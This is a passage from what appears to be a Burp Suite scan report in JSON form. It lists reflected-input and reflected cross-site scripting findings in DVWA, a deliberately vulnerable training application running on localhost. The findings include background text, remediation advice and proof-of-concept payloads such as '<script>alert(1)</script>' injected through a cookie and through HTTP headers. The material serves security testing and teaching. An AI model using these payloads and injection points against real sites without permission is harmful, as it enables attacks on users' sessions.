        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "40": {
        "\ufeffissue__serialNumber": "5.37938E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [Referer HTTP header]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>Referer</b> HTTP header is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "41": {
        "\ufeffissue__serialNumber": "6.79738E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli_blind/",
        "issue__location": "/dvwa/vulnerabilities/sqli_blind/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>dvyh7'&gt;&lt;script&gt;alert(1)&lt;/script&gt;v2hum</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "42": {
        "\ufeffissue__serialNumber": "1.18753E+17",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli_blind/",
        "issue__location": "/dvwa/vulnerabilities/sqli_blind/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "43": {
        "\ufeffissue__serialNumber": "9.05385E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]",
        "issue__severity": "Low",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>User-Agent</b> HTTP header is copied into the HTML document as plain text between tags. The payload <b>akyn8&lt;script&gt;alert(1)&lt;/script&gt;u7423</b> was submitted in the User-Agent HTTP header. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a request header, the application's behavior is not trivial to exploit in an attack against another user. In the past, methods have existed of using client-side technologies such as Flash to cause another user to make a request containing an arbitrary HTTP header. If you can use such a technique, you can probably leverage it to exploit the XSS flaw. This limitation partially mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "44": {
        "\ufeffissue__serialNumber": "3.34958E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>User-Agent</b> HTTP header is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "45": {
        "\ufeffissue__serialNumber": "4.87047E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_s/",
        "issue__location": "/dvwa/vulnerabilities/xss_s/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
